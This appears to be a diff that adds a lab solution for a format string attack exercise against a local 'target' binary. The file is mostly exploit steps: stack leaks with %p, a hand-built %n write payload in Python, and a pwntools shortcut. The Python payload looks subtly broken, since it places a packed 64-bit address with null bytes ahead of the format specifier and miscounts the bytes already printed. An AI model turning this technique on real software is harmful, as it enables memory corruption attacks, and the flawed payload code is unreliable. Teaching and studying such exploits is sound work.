@@ -1,0 +1,31 @@
+Solution — Exercise 04: Format String Attack
+=============================================
+
+Step 1: Find the address of secret
+  nm target | grep secret
+  → e.g. 0x0000000000404028
+
+Step 2: Find your format string index
+  python3 -c "print('AAAA' + '.%p' * 20)" | ./target
+  Look for 0x41414141 in the output.
+  Count the position — that is your index N.
+
+Step 3: Craft the payload
+  python3 -c "
+  import sys, struct
+  addr  = 0x404028        # address of secret
+  index = 8               # your index from step 2
+  pad   = 0x1337 - 8      # 8 bytes already printed by the address
+  payload = struct.pack('<Q', addr) + b'A' * pad + f'%{index}\$n'.encode()
+  sys.stdout.buffer.write(payload + b'\n')
+  " | ./target
+
+Step 4: Using pwntools (easier)
+  from pwn import *
+  elf = ELF('./target')
+  payload = fmtstr_payload(index, {elf.sym['secret']: 0x1337})
+
+Why it works:
+  printf() interprets your input as a format string.
+  %n lets you write an arbitrary value to an arbitrary address —
+  turning a logging bug into a full memory write primitive.
